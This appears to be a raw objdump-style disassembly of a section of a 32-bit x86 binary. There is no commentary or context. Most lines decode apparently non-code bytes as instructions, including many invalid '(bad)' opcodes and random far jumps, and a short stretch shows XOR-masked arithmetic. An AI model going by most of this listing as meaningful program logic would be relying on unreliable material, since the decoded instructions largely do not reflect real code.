  413905:	pop    ss
  413906:	pop    edx
  413907:	pop    ebx
  413908:	inc    edx
  413909:	fucomip st,st(5)
  41390b:	(bad)  
  41390c:	ins    BYTE PTR es:[edi],dx
  41390d:	cmp    DWORD PTR [edx-0x269d01f7],esi
  413913:	mov    edi,0x43b22a03
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	bound  ebp,QWORD PTR [esi-0x5df2326f]
  41391f:	scas   eax,DWORD PTR es:[edi]
  413920:	push   ds
  413921:	cmp    eax,ecx
  413923:	dec    ebx
  413924:	aam    0x8f
  413926:	mov    DWORD PTR [edi],edx
  413928:	add    eax,0xf9c2f875
  41392d:	ret    0xc3b0
  413930:	loopne 0x41396e
  413932:	xchg   edi,eax
  413933:	inc    edi
  413934:	mov    dh,BYTE PTR [ebx-0x64]
  413937:	bound  ecx,QWORD PTR [esi-0x3e]
  41393a:	pop    ebp
  41393b:	push   edx
  41393c:	bound  eax,QWORD PTR [ebp+0x6d]
  41393f:	pop    ss
  413940:	push   esi
  413941:	imul   ebx,DWORD PTR [ebx],0x5b
  413944:	out    dx,al
  413945:	or     al,0x9e
  413947:	(bad)  
  413948:	clc    
  413949:	mov    edi,DWORD PTR [edx+eax*4-0x46a731f8]
  413950:	push   edi
  413951:	mov    ch,0xa4
  413953:	sub    eax,0x9299776c
  413958:	fcomip st,st(2)
  41395a:	mov    ah,0xdc
  41395c:	(bad)  
  41395d:	out    0x7f,al
  41395f:	and    DWORD PTR [ebx],eax
  413961:	pop    esi
  413962:	and    edi,DWORD PTR [edx+0x41]
  413965:	data16 cmc 
  413967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413968:	ficom  DWORD PTR [ebx-0x68f2ed88]
  41396e:	loop   0x413928
  413970:	dec    esi
  413971:	cwde   
  413972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413973:	and    DWORD PTR ds:0xe40a9b11,ebx
  413979:	fisub  WORD PTR [ebp+0x1aa5c02a]
  41397f:	inc    eax
  413980:	add    dx,0x106
  413985:	imul   eax,DWORD PTR [ebp+ebx*4+0x7abd93c1],0xf9752349
  413990:	inc    edx
  413991:	sbb    BYTE PTR [ebx+edi*1+0x59],0x2a
  413996:	(bad)  
  413998:	repz pop ebx
  41399a:	cli    
  41399b:	dec    eax
  41399c:	js     0x4139ff
  41399e:	pop    ss
  41399f:	jne    0x41394c
  4139a1:	add    eax,0x5b41bf
  4139a6:	addr16 pop esp
  4139a8:	and    eax,0xf1aa755d
  4139ad:	scas   eax,DWORD PTR es:[edi]
  4139ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139af:	xor    DWORD PTR [ebx-0x51433f46],0x3
  4139b6:	and    ecx,DWORD PTR [edi+0x33e9d725]
  4139bc:	shl    DWORD PTR [edi],cl
  4139be:	mov    eax,0x5f37782e
  4139c3:	adc    DWORD PTR [ebp+0x62],edi
  4139c6:	inc    esp
  4139c7:	jno    0x4139fd
  4139c9:	jp     0x413a0e
  4139cb:	mov    ebx,0xc1dc0b3f
  4139d0:	mov    dl,0x56
  4139d2:	mov    eax,0x803960a6
  4139d7:	jg     0x4139fa
  4139d9:	rcr    BYTE PTR ss:[ebx],0x84
  4139dd:	int    0x86
  4139df:	adc    BYTE PTR [ecx+edx*2],bl
  4139e2:	xor    bh,BYTE PTR [ecx+eax*4+0x12637322]
  4139e9:	test   al,0x5
  4139eb:	fimul  WORD PTR gs:[edi+0x7a3dada]
  4139f2:	mov    dl,0x48
  4139f4:	push   cs
  4139f5:	pop    ecx
  4139f6:	mov    al,0xad
  4139f8:	dec    esp
  4139f9:	ror    esp,0x95
  4139fc:	mov    WORD PTR [ebx-0x5190cbd5],?
  413a02:	sbb    DWORD PTR [eax-0x2b235954],ebp
  413a08:	mov    WORD PTR [edx+0x72],fs
  413a0b:	popf   
  413a0c:	daa    
  413a0d:	sahf   
  413a0e:	push   ss
  413a0f:	in     al,0x3a
  413a11:	dec    ebx
  413a12:	js     0x41399c
  413a14:	mov    bl,0x16
  413a16:	fnstcw WORD PTR ds:0xd233cb47
  413a1c:	and    DWORD PTR [eax-0xa],edi
  413a1f:	(bad)  
  413a20:	mov    esp,0xa6e9615f
  413a25:	icebp  
  413a26:	jb     0x413aa6
  413a28:	adc    cl,BYTE PTR [edx]
  413a2a:	ja     0x4139c1
  413a2c:	mov    DWORD PTR [ecx-0xb],edi
  413a2f:	xchg   ebx,eax
  413a30:	cmp    dl,BYTE PTR [eax]
  413a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a33:	sub    eax,0x7772811c
  413a38:	les    esp,FWORD PTR [ebp+0x32a326cf]
  413a3e:	scas   eax,DWORD PTR es:[edi]
  413a3f:	(bad)  
  413a40:	(bad)  
  413a42:	popf   
  413a43:	fist   DWORD PTR [eax]
  413a45:	lahf   
  413a46:	cmp    al,BYTE PTR [ebx-0xc]
  413a49:	scas   al,BYTE PTR es:[edi]
  413a4a:	or     BYTE PTR [edi],dl
  413a4c:	mov    ah,0xc1
  413a4e:	sub    eax,0x677b207
  413a53:	sti    
  413a54:	into   
  413a55:	fstp   QWORD PTR [edx+0x198df778]
  413a5b:	outs   dx,BYTE PTR ds:[esi]
  413a5c:	inc    edi
  413a5d:	xchg   ecx,eax
  413a5e:	xchg   edx,eax
  413a5f:	pop    es
  413a60:	push   ebp
  413a61:	aas    
  413a62:	push   esp
  413a63:	imul   esi,edx,0xcb554912
  413a69:	arpl   WORD PTR [eax+0x7800f35c],bx
  413a6f:	xchg   esp,eax
  413a70:	ret    
  413a71:	js     0x413a60
  413a73:	jnp    0x413ad1
  413a75:	loope  0x413a7f
  413a77:	add    edx,DWORD PTR [esp+ecx*4-0x41]
  413a7b:	mov    edi,0xd3b5c3f
  413a80:	nop
  413a81:	repz cmp DWORD PTR [ebp-0x4d],ebx
  413a85:	mov    ah,0x2b
  413a87:	(bad)  
  413a88:	xchg   esp,eax
  413a89:	test   eax,0x4227e03a
  413a8e:	std    
  413a8f:	mov    BYTE PTR [ecx-0x1],dl
  413a92:	sub    ebx,DWORD PTR [esi-0x48]
  413a95:	dec    eax
  413a96:	sbb    eax,ebp
  413a98:	sub    al,0xbc
  413a9a:	(bad)  
  413a9b:	pop    eax
  413a9c:	cdq    
  413a9d:	ret    
  413a9e:	or     eax,0x934c4a27
  413aa3:	jnp    0x413a30
  413aa5:	xchg   esi,eax
  413aa6:	mov    al,0x5a
  413aa8:	inc    edi
  413aa9:	jb     0x413aa7
  413aab:	dec    esp
  413aac:	adc    eax,DWORD PTR [edi-0x717fddd8]
  413ab2:	into   
  413ab3:	mov    eax,0xdf8f3e27
  413ab8:	jl     0x413a50
  413aba:	pop    edi
  413abb:	jne    0x413ae8
  413abd:	iret   
  413abe:	and    DWORD PTR [eax],ebp
  413ac0:	sbb    DWORD PTR [eax],ecx
  413ac2:	push   cs
  413ac3:	add    al,BYTE PTR [eax]
  413ac5:	mov    BYTE PTR [eax-0x68],ch
  413ac8:	sub    DWORD PTR [edi+0x6436e644],ebx
  413ace:	and    edi,0xffffff99
  413ad1:	jnp    0x413b32
  413ad3:	imul   ebp,ebx,0x68
  413ad6:	cwde   
  413ad7:	or     eax,esp
  413ad9:	es pushf 
  413adb:	push   ebp
  413adc:	pop    ds
  413add:	xchg   ebp,eax
  413ade:	jg     0x413aff
  413ae0:	push   es
  413ae1:	rcr    DWORD PTR [esi],cl
  413ae3:	aaa    
  413ae4:	xlat   BYTE PTR ds:[ebx]
  413ae5:	cmp    BYTE PTR [ecx],dh
  413ae7:	xor    eax,0x2d079ddc
  413aec:	bound  eax,QWORD PTR [ebp-0x6f58f18b]
  413af2:	fsubr  st(3),st
  413af4:	jb     0x413b1a
  413af6:	mov    al,0x4d
  413af8:	test   BYTE PTR [ebp+0x59],cl
  413afb:	xchg   BYTE PTR [edi-0x2b278636],ch
  413b01:	sbb    DWORD PTR [ecx+eax*8],eax
  413b04:	jmp    eax
  413b06:	inc    ebx
  413b07:	js     0x413af2
  413b09:	dec    ebx
  413b0a:	ret    
  413b0b:	lea    ecx,[ecx+0x5d]
  413b0e:	call   0x512a:0x9ffd6e44
  413b15:	push   ss
  413b16:	fidivr DWORD PTR [esi]
  413b18:	(bad)  
  413b19:	fmul   st,st(7)
  413b1b:	imul   ebx,DWORD PTR [esi],0x1c337738
  413b21:	ficom  WORD PTR [edx+0x58]
  413b24:	hlt    
  413b25:	push   eax
  413b26:	lods   eax,DWORD PTR ds:[esi]
  413b27:	dec    ebx
  413b28:	fstp   QWORD PTR [ecx+0x436e5fd3]
  413b2e:	sbb    cl,BYTE PTR [eax-0x30]
  413b31:	ret    0x216d
  413b34:	xor    cl,BYTE PTR [esi+0x59]
  413b37:	and    esi,DWORD PTR [ebx]
  413b39:	popf   
  413b3a:	or     dl,al
  413b3c:	pop    ecx
  413b3d:	xchg   ebp,eax
  413b3e:	pushf  
  413b3f:	xor    BYTE PTR [ebx+0x24],dh
  413b42:	adc    al,0xc9
  413b44:	sbb    ebx,DWORD PTR [eax+0xd]
  413b47:	cwde   
  413b48:	pop    eax
  413b49:	imul   ebx,DWORD PTR [esi],0x19c0b82f
  413b4f:	xchg   ecx,eax
  413b50:	bnd ret 
  413b52:	loope  0x413b4c
  413b54:	pop    ds
  413b55:	(bad)  
  413b56:	arpl   WORD PTR [ebx+0x10],si
  413b59:	push   ss
  413b5a:	sub    BYTE PTR ds:0x4766570d,cl
  413b60:	and    esp,DWORD PTR [ebx]
  413b62:	xor    eax,0xc06cca82
  413b67:	lods   al,BYTE PTR ds:[esi]
  413b68:	test   eax,0x1a8eff50
  413b6d:	inc    ebp
  413b6e:	sub    eax,0x5fd64c57
  413b73:	xor    DWORD PTR [edx-0x6eacc7e0],edx
  413b79:	jnp    0x413b15
  413b7b:	xchg   bl,bh
  413b7d:	push   ss
  413b7e:	int3   
  413b7f:	sbb    al,0x41
  413b81:	retf   
  413b82:	mov    esi,DWORD PTR [eax+0x3e1cff79]
  413b88:	xchg   ebx,eax
  413b89:	or     bl,BYTE PTR [edx+0x29]
  413b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8d:	xchg   edx,eax
  413b8e:	xlat   BYTE PTR ds:[ebx]
  413b8f:	and    al,0x2f
  413b91:	pop    ecx
  413b92:	test   al,0xa9
  413b94:	(bad)  
  413b95:	fld    QWORD PTR [ebp-0x5903e490]
  413b9b:	int    0xf8
  413b9d:	sbb    bh,ch
  413b9f:	mov    dl,0xc
  413ba1:	mov    BYTE PTR [ecx-0x46],al
  413ba4:	mov    dh,0x8
  413ba6:	sub    eax,0x851971ff
  413bab:	test   DWORD PTR [edi+edi*8+0x10],eax
  413baf:	adc    al,BYTE PTR [eax+eax*2-0x4b]
  413bb3:	cmp    ebp,DWORD PTR [edx+0x1aad8abe]
  413bb9:	fldcw  WORD PTR [edx-0x56]
  413bbc:	jl     0x413bdc
  413bbe:	push   esp
  413bbf:	add    eax,0x3502efda
  413bc4:	in     eax,0x77
  413bc6:	out    dx,al
  413bc7:	push   ecx
  413bc8:	popf   
  413bc9:	dec    esi
  413bca:	and    al,0x3f
  413bcc:	mov    eax,ds:0x38d81b3c
  413bd1:	je     0x413c3d
  413bd3:	mov    edi,0xebb45ef7
  413bd8:	out    0xf8,eax
  413bda:	cld    
  413bdb:	in     al,0xef
  413bdd:	imul   eax,DWORD PTR [esp+esi*4+0x46922301],0xa3c01aab
  413be8:	(bad)  
  413be9:	mov    esi,0xb12dac1b
  413bee:	xor    eax,0xd181a6f8
  413bf3:	adc    eax,0x99bb081c
  413bf8:	cwde   
  413bf9:	jno    0x413b84
  413bfb:	test   eax,0x34decd6f
  413c00:	and    DWORD PTR [eax],ecx
  413c02:	shl    DWORD PTR [eax+0x3b],0xd2
  413c06:	mov    esp,0xe26162c5
  413c0b:	and    al,0x73
  413c0d:	cmp    ebx,eax
  413c0f:	jno    0x413c30
  413c11:	xchg   esi,eax
  413c12:	xor    ecx,ebx
  413c14:	(bad)  
  413c15:	ins    BYTE PTR es:[edi],dx
  413c16:	(bad)  
  413c17:	xchg   edx,eax
  413c18:	ficomp WORD PTR [ebp+0x4e]
  413c1b:	sbb    eax,DWORD PTR [ecx-0x774ce1ab]
  413c21:	adc    eax,0x9c6ed675
  413c26:	enter  0x1b18,0xf
  413c2a:	pop    eax
  413c2b:	dec    eax
  413c2c:	out    0x65,eax
  413c2e:	es daa 
  413c30:	imul   BYTE PTR [ebx-0x2710d14e]
  413c36:	addr16 repz int3 
  413c39:	jae    0x413c11
  413c3b:	repnz stc 
  413c3d:	int    0x21
  413c3f:	add    eax,0x2e033da5
  413c44:	mov    BYTE PTR [ebx],dh
  413c46:	imul   edx,DWORD PTR [ecx],0x5cd8e1b6
  413c4c:	sbb    ecx,0xffffff9f
  413c4f:	sub    ebp,ebx
  413c51:	dec    ebx
  413c52:	iret   
  413c53:	retf   
  413c54:	cmp    eax,DWORD PTR [ecx]
  413c56:	pop    esp
  413c57:	jmp    0xd86b:0xf5c2a557
  413c5e:	test   eax,0x3c210ef
  413c63:	cmp    ah,BYTE PTR ds:0xa58abac5
  413c69:	mov    dl,0x7b
  413c6b:	mov    ebx,0x242a840f
  413c70:	add    BYTE PTR [eax],al
  413c72:	mov    DWORD PTR [ebp-0x20],0x0
  413c79:	push   0x3
  413c7b:	xor    edx,edx
  413c7d:	pop    edx
  413c7e:	add    edx,0x8
  413c81:	push   edx
  413c82:	pop    ecx
  413c83:	push   0x6
  413c85:	dec    ecx
  413c86:	pop    ebx
  413c87:	dec    ebx
  413c88:	xchg   ebx,ecx
  413c8a:	sub    ebx,ecx
  413c8c:	xchg   ebx,ecx
  413c8e:	dec    ecx
  413c8f:	mov    eax,DWORD PTR [ebp-0x1c]
  413c92:	imul   eax,ecx
  413c95:	sub    esp,eax
  413c97:	mov    DWORD PTR [ebp-0x20],esp
  413c9a:	mov    eax,DWORD PTR [ebp-0x4]
  413c9d:	xor    eax,esi
  413c9f:	add    eax,edi
  413ca1:	jmp    0x416075
  413ca6:	mov    ecx,DWORD PTR [ebp-0xc]
  413ca9:	mov    eax,DWORD PTR [ebp+0x8]
  413cac:	mov    edx,DWORD PTR [ebp+0x14]
  413caf:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  413cb3:	xor    ecx,esi
  413cb5:	add    ecx,edi
  413cb7:	xor    edx,edx
  413cb9:	div    ecx
  413cbb:	mov    ecx,DWORD PTR [ebp-0x4]
  413cbe:	xor    ecx,esi
  413cc0:	lea    eax,[ecx+eax*1+0x3272ec]
  413cc7:	mov    ecx,DWORD PTR [ebp+0x8]
  413cca:	mov    edx,DWORD PTR [ebp-0x20]
  413ccd:	mov    DWORD PTR [edx+ecx*4],eax
  413cd0:	mov    eax,DWORD PTR [ebp-0xc]
  413cd3:	jmp    0x416069
  413cd8:	pop    es
  413cd9:	adc    al,0xab
  413cdb:	test   DWORD PTR [ebx+0x6a94fb79],ebx
  413ce1:	fadd   DWORD PTR [edx-0x36]
  413ce4:	iret   
  413ce5:	or     BYTE PTR [eax+0x5a],cl
  413ce8:	shl    BYTE PTR [ebp+edi*2+0x7a],1
  413cec:	add    eax,0xb47a7a5f
  413cf1:	ja     0x413d29
  413cf3:	in     eax,0x6d
  413cf5:	aas    
  413cf6:	mov    bh,0x36
  413cf8:	jo     0x413cd5
  413cfa:	ins    DWORD PTR es:[edi],dx
  413cfb:	or     eax,0x19cc2570
  413d00:	lea    esi,[edi+ecx*8+0x5d657771]
  413d07:	sub    DWORD PTR [edi+0x8],ebx
  413d0a:	dec    ecx
  413d0b:	xchg   BYTE PTR [ebp+edi*4-0x33],ch
  413d0f:	daa    
  413d10:	pop    es
  413d11:	inc    edi
  413d12:	lock adc bh,ah
  413d15:	adc    DWORD PTR [ecx+0x6f],esp
  413d18:	fst    st(1)
  413d1a:	mov    ebx,0xc59536f2
  413d1f:	arpl   WORD PTR [ecx+eax*1],dx
  413d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d23:	xchg   ecx,eax
  413d24:	std    
  413d25:	loope  0x413d35
  413d27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d28:	jecxz  0x413cdd
  413d2a:	test   DWORD PTR [edx],ebp
  413d2c:	mov    BYTE PTR [esi-0x76],ch
  413d2f:	and    eax,0x6571c5
  413d34:	mov    BYTE PTR [eax+0x28],0x34
  413d38:	out    dx,eax
  413d39:	(bad)  
  413d3a:	in     al,0xc9
  413d3c:	cmp    BYTE PTR [edi+0x40],dh
  413d3f:	fnsave [ecx-0x2e42c5ea]
  413d45:	fimul  DWORD PTR [edi-0x47]
  413d48:	retf   0x133b
  413d4b:	fs int 0x18
  413d4e:	xor    al,0xe7
  413d50:	test   eax,0x8a0b7456
  413d55:	arpl   WORD PTR [edi],si
  413d57:	cmp    BYTE PTR [esi],0xd1
  413d5a:	es ds jmp 0x12d14db0
  413d61:	imul   edx,DWORD PTR [ebx+0x58],0x6a0a4b94
  413d68:	scas   al,BYTE PTR es:[edi]
  413d69:	fistp  WORD PTR [ebp+0x62]
  413d6c:	mov    ds:0xb348c447,eax
  413d71:	xlat   BYTE PTR ds:[ebx]
  413d72:	inc    eax
  413d73:	mov    ds:0x7fbeeb0e,al
  413d78:	retf   0xec54
  413d7b:	jb     0x413d86
  413d7d:	xchg   DWORD PTR [ebx-0x2b26ac3d],esp
  413d83:	inc    edi
  413d84:	mov    eax,ds:0x5472d263
  413d89:	or     eax,0xb9537869
  413d8e:	iret   
  413d8f:	loop   0x413d1d
  413d91:	push   edx
  413d92:	cmp    eax,0x3a36d805
  413d97:	jle    0x413dc6
  413d99:	and    dh,BYTE PTR [edx]
  413d9b:	std    
  413d9c:	mov    cs,ebp
  413d9e:	xchg   edi,eax
  413d9f:	paddsw mm7,mm7
  413da2:	push   0xffffffeb
  413da4:	jp     0x413dbc
  413da6:	xchg   esi,eax
  413da7:	jne    0x413dcf
  413da9:	sahf   
  413daa:	jmp    0x413de6
  413dac:	mov    ch,0x87
  413dae:	inc    DWORD PTR [ebx]
  413db0:	leave  
  413db1:	pop    ebp
  413db2:	mov    esi,0x9aa387de
  413db7:	or     DWORD PTR [edi-0x2c],esp
  413dba:	hlt    
  413dbb:	es push esi
  413dbd:	imul   ebx,DWORD PTR [edx],0x56069936
  413dc3:	jmp    0x413d72
  413dc5:	pop    ecx
  413dc6:	outs   dx,BYTE PTR ds:[esi]
  413dc7:	mov    ds:0x72d105ce,al
  413dcc:	ret    0x4854
  413dcf:	pop    esp
  413dd0:	and    BYTE PTR [esi-0x23],cl
  413dd3:	in     eax,dx
  413dd4:	xor    DWORD PTR [eax-0xc],ecx
  413dd7:	push   cs
  413dd8:	loop   0x413db9
  413dda:	test   al,0xf3
  413ddc:	inc    eax
  413ddd:	cs xchg ecx,eax
  413ddf:	(bad)  
  413de1:	xor    BYTE PTR [edx+0x27],al
  413de4:	fcomp  QWORD PTR [ebp+0x70504ae3]
  413dea:	mov    ds:0xb587e2d2,eax
  413def:	mov    WORD PTR [edi-0x2245f71d],?
  413df5:	mov    al,0xc6
  413df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413df8:	and    dh,BYTE PTR [esi]
  413dfa:	nop
  413dfb:	iret   
  413dfc:	push   esi
  413dfd:	xor    esp,edi
  413dff:	not    DWORD PTR [eax+eiz*4]
  413e02:	jne    0x413dde
  413e04:	cwde   
  413e05:	sti    
  413e06:	jae    0x413e07
  413e08:	push   esi
  413e09:	push   es
  413e0a:	jns    0x413dd9
  413e0c:	mov    esi,0xf3f0963c
  413e11:	pop    ss
  413e12:	mov    ah,0x56
  413e14:	fnstenv [ebx-0x16dc4441]
  413e1a:	jmp    0x413df8
  413e1c:	in     al,0x40
  413e1e:	sbb    DWORD PTR [ebx+0x3],esp
  413e21:	push   ds
  413e22:	fild   DWORD PTR [edi+0x52327b4e]
  413e28:	mov    WORD PTR [ecx+eax*2+0x33558826],ds
  413e2f:	cmp    al,0x3a
  413e31:	std    
  413e32:	(bad)  
  413e33:	cmp    al,0x90
  413e35:	mov    esi,0xb438fbb4
  413e3a:	pop    esp
  413e3b:	sub    DWORD PTR [esi],edi
  413e3d:	dec    edi
  413e3e:	xchg   DWORD PTR [ebx+0xa28bca1],esi
  413e44:	retf   0x4f40
  413e47:	das    
  413e48:	lods   al,BYTE PTR ds:[esi]
  413e49:	ret    0x4d04
  413e4c:	pop    esp
  413e4d:	sbb    al,0x1c
  413e4f:	mov    ah,0x7a
  413e51:	stos   DWORD PTR es:[edi],eax
  413e52:	fistp  QWORD PTR ds:0x7b1f88d7
  413e58:	arpl   WORD PTR [ecx],sp
  413e5a:	les    ecx,FWORD PTR [esi-0x7bd718c1]
  413e60:	jmp    0x58511369
  413e65:	cmp    al,0xdf
  413e67:	adc    eax,0xcaf7f87a
  413e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e6d:	add    BYTE PTR [edi+eax*1],bl
  413e70:	cmp    ebp,ebx
  413e72:	arpl   WORD PTR [ebp-0x2a],si
  413e75:	lods   eax,DWORD PTR ds:[esi]
  413e76:	enter  0x7823,0x12
  413e7a:	sbb    al,0xe5
  413e7c:	in     al,0xcd
  413e7e:	jo     0x413eda
  413e80:	(bad)  
  413e81:	outs   dx,BYTE PTR ds:[esi]
  413e82:	xor    DWORD PTR [ebp-0x20],edx
  413e85:	fist   DWORD PTR [ebp+0x3ea3dca]
  413e8b:	sub    ecx,eax
  413e8d:	pop    ebp
  413e8e:	push   es
  413e8f:	sbb    eax,0x79dfa721
  413e94:	outs   dx,BYTE PTR ds:[esi]
  413e95:	push   ecx
  413e96:	adc    edx,ebp
  413e98:	je     0x413eba
  413e9a:	or     eax,0x117b4676
  413e9f:	ins    DWORD PTR es:[edi],dx
  413ea0:	aas    
  413ea1:	nop
  413ea2:	call   0x1257c202
  413ea7:	pusha  
  413ea8:	sbb    al,0xc
  413eaa:	or     eax,DWORD PTR [edi]
  413eac:	mov    esi,0xdbe9a541
  413eb1:	loopne 0x413ee9
  413eb3:	das    
  413eb4:	mov    ebp,ebx
  413eb6:	ja     0x413ee4
  413eb8:	rol    DWORD PTR ss:[eax-0x23],1
  413ebc:	ffree  st(4)
  413ebe:	sub    BYTE PTR [edx-0x7f],cl
  413ec1:	xchg   esp,ecx
  413ec3:	pop    ebx
  413ec4:	mov    ecx,0x295cf58a
  413ec9:	mov    BYTE PTR [esi+0x63c17b70],dh
  413ecf:	stos   DWORD PTR es:[edi],eax
  413ed0:	xchg   esi,eax
  413ed1:	mov    BYTE PTR [eax+0x28f38e36],ch
  413ed7:	jmp    0x8ed415d7
  413edc:	xchg   esp,eax
  413edd:	lea    esi,[edx+0x1f]
  413ee0:	cmp    al,0xa
  413ee2:	jns    0x413e6a
  413ee4:	push   esi
  413ee5:	cld    
  413ee6:	js     0x413f3a
  413ee8:	aam    0xf1
  413eea:	jecxz  0x413f50
  413eec:	push   ss
  413eed:	jmp    0xcb4019e2
  413ef2:	ret    0x804c
  413ef5:	retf   
  413ef6:	dec    ebx
  413ef7:	cli    
  413ef8:	lods   al,BYTE PTR ds:[esi]
  413ef9:	lods   eax,DWORD PTR ds:[esi]
  413efa:	push   esi
  413efb:	pop    es
  413efc:	outs   dx,BYTE PTR ds:[esi]
  413efd:	scas   al,BYTE PTR es:[edi]
  413efe:	retf   0xb11f
  413f01:	(bad)  
  413f02:	js     0x413ee3
  413f04:	jl     0x413f1f
  413f06:	daa    
  413f07:	call   0x6b17f9dc
  413f0c:	mov    esi,0xd6fcfc09
  413f11:	add    DWORD PTR [edx],ecx
  413f13:	popf   
  413f14:	lods   eax,DWORD PTR ds:[esi]
  413f15:	data16 mov BYTE PTR [ebp-0x2e4b2d6f],al
  413f1c:	dec    edi
  413f1d:	xor    bl,BYTE PTR [eax-0x1]
  413f20:	mov    DWORD PTR [edx+0x7],eax
  413f23:	icebp  
  413f24:	fdiv   QWORD PTR [ebx+0x513145ec]
  413f2a:	out    dx,eax
  413f2b:	mov    dh,0xe2
  413f2d:	sar    DWORD PTR [ecx-0x39ea801],1
  413f33:	int    0x2b
  413f35:	adc    DWORD PTR [edx],esi
  413f37:	xchg   esi,eax
  413f38:	mov    edx,0x47617e0b
  413f3d:	lahf   
  413f3e:	push   cs
  413f3f:	and    BYTE PTR [eax],dl
  413f41:	jae    0x413f04
  413f43:	sub    al,0xfb
  413f45:	sbb    cl,BYTE PTR [ebx-0x7d]
  413f48:	pop    eax
  413f49:	es or  al,0xf3
  413f4c:	jnp    0x413f02
  413f4e:	push   ebp
  413f4f:	jo     0x413fb5
  413f51:	lahf   
  413f52:	ror    DWORD PTR [edx+0x39],1
  413f55:	lahf   
  413f56:	mov    edi,0x1fc78191
  413f5b:	adc    edx,0x5baf6c21
  413f61:	dec    edx
  413f62:	loope  0x413fc4
  413f64:	jno    0x413fd1
  413f66:	add    eax,0xbbf726ea
  413f6b:	not    edi
  413f6d:	cmp    DWORD PTR [eax+ebx*8-0x35],esi
  413f71:	cmp    al,BYTE PTR [ebx*1-0x4089580c]
  413f78:	dec    ecx
  413f79:	or     DWORD PTR [eax-0x39],0x73227a70
  413f80:	xchg   BYTE PTR ds:0xcfcd15ae,al
  413f86:	(bad)  
  413f87:	xor    BYTE PTR [edi],dh
  413f89:	in     al,0x6b
  413f8b:	mov    ebx,0x5562b1f5
  413f90:	inc    ebp
  413f91:	push   ebx
  413f92:	ret    
  413f93:	(bad)  
  413f94:	jae    0x413f6d
  413f96:	std    
  413f97:	adc    eax,0xb7dd1c96
  413f9c:	cmp    edx,DWORD PTR [ebp+0x3f11eb2f]
  413fa2:	xchg   esp,eax
  413fa3:	dec    esi
  413fa4:	es cmp eax,0xf21f80ea
  413faa:	adc    ecx,DWORD PTR [edx-0x2c]
  413fad:	push   ecx
  413fae:	cld    
  413faf:	aas    
  413fb0:	aas    
  413fb1:	lods   al,BYTE PTR ds:[esi]
  413fb2:	push   ebp
  413fb3:	pushf  
  413fb4:	jmp    0x413f39
  413fb6:	(bad)  
  413fb7:	jl     0x413f83
  413fb9:	clc    
  413fba:	and    ebx,DWORD PTR [ecx+0x51]
  413fbd:	mov    bh,0x75
  413fbf:	retf   
  413fc0:	test   al,0x56
  413fc2:	in     eax,dx
  413fc3:	mov    al,ds:0xcee1899f
  413fc8:	pop    es
  413fc9:	push   edi
  413fca:	and    BYTE PTR ds:[ebp+0x6d],0x16
  413fcf:	jmp    0x4ab6f1a3
  413fd4:	leave  
  413fd5:	mov    edi,0x1da54a34
  413fda:	mov    dh,0x50
  413fdc:	arpl   WORD PTR [ebx-0x80],si
  413fdf:	add    esi,DWORD PTR [edx]
  413fe1:	xchg   ecx,eax
  413fe2:	mov    DWORD PTR [esi-0x6a0c5673],esp
  413fe8:	xchg   DWORD PTR [ecx],ecx
  413fea:	in     eax,dx
  413feb:	inc    ebp
  413fec:	xchg   esi,eax
  413fed:	cld    
  413fee:	mov    bh,0x75
  413ff0:	je     0x413fbe
  413ff2:	sahf   
  413ff3:	sbb    cl,BYTE PTR [edx+ebp*4-0x3]
  413ff7:	retf   0x761d
  413ffa:	test   DWORD PTR [edi],0x7e5c8bdb
  414000:	repnz popa 
  414002:	adc    eax,0xe574ab6d
  414007:	cmp    al,ah
  414009:	sub    DWORD PTR [esi+edx*1-0x63862242],esp
  414010:	aam    0x31
  414012:	stc    
  414013:	int3   
  414014:	add    BYTE PTR [ebp+0x367ff2ed],dh
  41401a:	mov    ds:0x9764857f,al
  41401f:	scas   al,BYTE PTR es:[edi]
  414020:	lahf   
  414021:	mov    dh,0x3
  414023:	inc    ecx
  414024:	sbb    BYTE PTR [edx],0xf8
  414027:	cmp    ch,0xd7
  41402a:	mov    edx,ss
  41402c:	lods   eax,DWORD PTR ds:[esi]
  41402d:	pop    ds
  41402e:	(bad)
  414032:	lea    eax,ss:[ebx+0x7059a17c]
  414039:	inc    ecx
  41403a:	xchg   cl,al
  41403c:	or     eax,0x679bb217
  414041:	das    
  414042:	add    eax,0x9e0ab338
  414047:	out    0x31,eax
  414049:	sahf   
  41404a:	fidiv  WORD PTR [edi-0x309ec732]
  414050:	mov    edi,0x6a0ce7e8
  414055:	sbb    eax,0x6566522f
  41405a:	mov    esi,0x2e05fbfb
  41405f:	and    al,0xc9
  414061:	ins    BYTE PTR es:[edi],dx
  414062:	xor    al,0x66
  414064:	popf   
  414065:	ds sahf 
  414067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414068:	or     eax,0xad70c26e
  41406d:	cmp    bl,BYTE PTR [di+0x1b]
  414071:	popf   
  414072:	xchg   edx,eax
  414073:	and    eax,0xfc257327
  414078:	cmp    BYTE PTR [esi-0x63080d9c],0xb1
  41407f:	sti    
  414080:	mov    BYTE PTR [esi+0x7c],al
  414083:	pushf  
  414084:	mov    dl,0xe5
  414086:	jne    0x414077
  414088:	lock add eax,0x4eb170ea
  41408e:	sbb    DWORD PTR ds:0x9b61fca1,eax
  414094:	and    BYTE PTR [eax-0x31],dl
  414097:	lods   eax,DWORD PTR ds:[esi]
  414098:	pop    eax
  414099:	je     0x41401e
  41409b:	test   BYTE PTR [eax-0x42],bh
  41409e:	repnz add bh,ch
  4140a1:	mov    dh,cl
  4140a3:	jo     0x4140f9
  4140a5:	dec    edx
  4140a6:	out    0xb3,al
  4140a8:	adc    edx,edi
  4140aa:	push   cs
  4140ab:	mov    bh,0x24
  4140ad:	sbb    DWORD PTR [edi+0x53345a72],edi
  4140b3:	sub    ebp,DWORD PTR [edi-0x4c]
  4140b6:	call   0xdefe:0x17b1eb18
  4140bd:	and    ecx,ebp
  4140bf:	aam    0xd1
  4140c1:	cwde   
  4140c2:	or     DWORD PTR [esi],esi
